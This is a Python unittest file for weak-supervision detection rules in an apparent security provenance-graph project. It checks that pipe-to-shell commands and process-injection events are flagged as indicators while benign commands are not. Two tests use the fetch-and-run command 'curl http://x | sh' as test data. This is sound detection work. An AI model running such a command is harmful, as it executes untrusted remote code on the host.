from __future__ import annotations

import unittest
from dataclasses import replace
from pathlib import Path

from config.ontology import EdgeType, NodeType
from parsers.events import EntityRef, Event
from parsers.rules.weak_supervision import (
    annotate_events_with_weak_rules,
    infer_rule_hits_for_event,
    load_weak_supervision_rules,
    rule_types_to_ioc_types,
)


class TestWeakSupervisionRules(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.repo = Path(__file__).resolve().parents[1]
        cls.rules = load_weak_supervision_rules(str(cls.repo))

    def test_setup_py_install_not_ranked_v2(self) -> None:
        ev = Event(
            edge_type=EdgeType.EXEC,
            src=EntityRef(NodeType.PROC, "p1"),
            dst=EntityRef(NodeType.PROC, "p2"),
            edge_attrs={"cmdline": "python setup.py install"},
            raw={"source_file": "azure_process.csv"},
        )
        hits, conf = infer_rule_hits_for_event(ev, self.rules, ioc_log_source=True)
        self.assertEqual(hits, [])
        self.assertEqual(conf, "")

    def test_pipe_to_shell_requires_ioc_log_for_high(self) -> None:
        ev = Event(
            edge_type=EdgeType.EXEC,
            src=EntityRef(NodeType.PROC, "a"),
            dst=EntityRef(NodeType.PROC, "b"),
            edge_attrs={"cmdline": "curl http://x | sh"},
            raw={"source_file": "noise.csv"},
        )
        hits, conf = infer_rule_hits_for_event(ev, self.rules, ioc_log_source=False)
        self.assertIn("tier2_pipe_to_shell", hits)
        self.assertEqual(conf, "medium")

        hits2, conf2 = infer_rule_hits_for_event(ev, self.rules, ioc_log_source=True)
        self.assertEqual(conf2, "high")

    def test_inject_edge_high(self) -> None:
        ev = Event(
            edge_type=EdgeType.INJECT,
            src=EntityRef(NodeType.PROC, "a"),
            dst=EntityRef(NodeType.PROC, "b"),
            edge_attrs={},
            raw={"source_file": "azure_events.csv"},
        )
        hits, conf = infer_rule_hits_for_event(ev, self.rules, ioc_log_source=True)
        self.assertIn("inject_edge", hits)
        self.assertEqual(conf, "high")

    def test_no_gt_ioc_required(self) -> None:
        ev = Event(
            edge_type=EdgeType.EXEC,
            src=EntityRef(NodeType.PROC, "a"),
            dst=EntityRef(NodeType.PROC, "b"),
            edge_attrs={"cmdline": "echo hello"},
            raw={"source_file": "azure_events.csv"},
        )
        hits, _ = infer_rule_hits_for_event(ev, self.rules)
        self.assertEqual(hits, [])

    def test_annotate_attaches_metadata(self) -> None:
        ev = Event(
            edge_type=EdgeType.EXEC,
            src=EntityRef(NodeType.PROC, "a"),
            dst=EntityRef(NodeType.PROC, "b"),
            edge_attrs={"cmdline": "curl http://x | sh", "has_curl": True},
            raw={"source_file": "azure_events.csv"},
        )
        out = annotate_events_with_weak_rules(
            [ev], self.rules, ioc_log_sources={"azure_events.csv": True}
        )
        self.assertTrue(out[0].edge_attrs.get("is_rule_hit"))
        self.assertTrue(out[0].edge_attrs.get("is_rule_hit_high"))
        self.assertTrue(out[0].edge_attrs.get("_rule_ioc_type"))


if __name__ == "__main__":
    unittest.main()
